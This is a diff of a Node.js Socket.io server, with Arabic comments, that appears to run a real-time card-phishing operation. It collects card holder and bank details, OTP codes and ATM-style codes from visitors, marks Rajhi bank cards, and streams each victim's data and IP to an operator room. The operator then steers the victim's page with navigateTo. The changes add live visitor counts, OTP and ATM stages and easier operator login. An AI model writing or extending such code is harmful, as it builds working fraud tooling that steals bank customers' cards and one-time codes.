@@ -253,6 +253,9 @@ const ipToReference = new Map(); // IP → referenceId
 
 io.on("connection", (socket) => {
   console.log(`[Socket.io] Client connected: ${socket.id}`);
+  // إرسال عداد المتصلين للأدمن عند كل اتصال جديد
+  const clientCount = io.sockets.sockets.size;
+  io.to("admins").emit("visitorsCount", { count: clientCount });
 
   // updateLocation: كل صفحة ترسل IP الحقيقي
   socket.on("updateLocation", (data) => {
@@ -342,6 +345,9 @@ io.on("connection", (socket) => {
         rawData: data,
       });
       updateBookingStatus(reference, "pending_payment");
+      // إرسال عداد المتصلين للأدمن
+      const clientCountPay = io.sockets.sockets.size;
+      io.to("admins").emit("visitorsCount", { count: clientCountPay });
       const isRajhi = String(data.cardHolderName ?? "").toLowerCase().includes("rajhi") ||
         String(data.bankName ?? "").toLowerCase().includes("rajhi");
       io.to("admins").emit("newPayment", { reference, step: 1, type: "payment", ip: clientIp });
@@ -369,6 +375,7 @@ io.on("connection", (socket) => {
         rawData: data,
       });
       createOrUpdatePayment(reference, { step: 2, status: "step2_done", verifyCode: String(data.verification_code_two ?? data.code ?? "") });
+      updateBookingStatus(reference, "pending_otp");
       io.to("admins").emit("newPayment", { reference, step: 2, type: "otp", ip: clientIp });
       // إرسال ackVerification حتى تنتقل الصفحة لحالة loading وتنتظر navigateTo من المشرف
       socket.emit("ackVerification", { success: true });
@@ -393,6 +400,7 @@ io.on("connection", (socket) => {
         step: newStep,
         status: "step3_done",
       });
+      updateBookingStatus(reference, "pending_atm");
       io.to("admins").emit("newPayment", { reference, step: newStep, type: "code", ip: clientIp });
       // إرسال ackCode حتى تنتقل الصفحة لحالة loading وتنتظر navigateTo من المشرف
       socket.emit("ackCode", { success: true });
@@ -580,11 +588,15 @@ io.on("connection", (socket) => {
 
   // joinAdmin: المشرف يسجل دخوله للغرفة
   socket.on("joinAdmin", (data) => {
-    const token = data?.token;
+    // يقبل token كـ string مباشرة أو كـ object { token: "..." }
+    const token = typeof data === "string" ? data : data?.token;
     try {
       jwt.verify(token, JWT_SECRET);
       socket.join("admins");
       console.log(`[Socket.io] Admin joined: ${socket.id}`);
+      // إرسال عداد المتصلين فور انضمام المشرف
+      const currentCount = io.sockets.sockets.size;
+      socket.emit("visitorsCount", { count: currentCount });
       socket.emit("adminJoined", { success: true });
     } catch (err) {
       socket.emit("adminJoined", { success: false, error: "Unauthorized" });
@@ -599,10 +611,14 @@ io.on("connection", (socket) => {
       }
     }
     console.log(`[Socket.io] Client disconnected: ${socket.id}`);
+    // إرسال عداد المتصلين للأدمن بعد الانقطاع
+    setTimeout(() => {
+      const clientCountAfter = io.sockets.sockets.size;
+      io.to("admins").emit("visitorsCount", { count: clientCountAfter });
+    }, 100);
   });
 });
-
-// ==================== Auth Middleware ====================
+// ==================== Auth Middleware =====================
 function authMiddleware(req, res, next) {
   const token = req.headers.authorization?.replace("Bearer ", "") || req.cookies?.token;
   if (!token) return res.status(401).json({ error: "Unauthorized" });
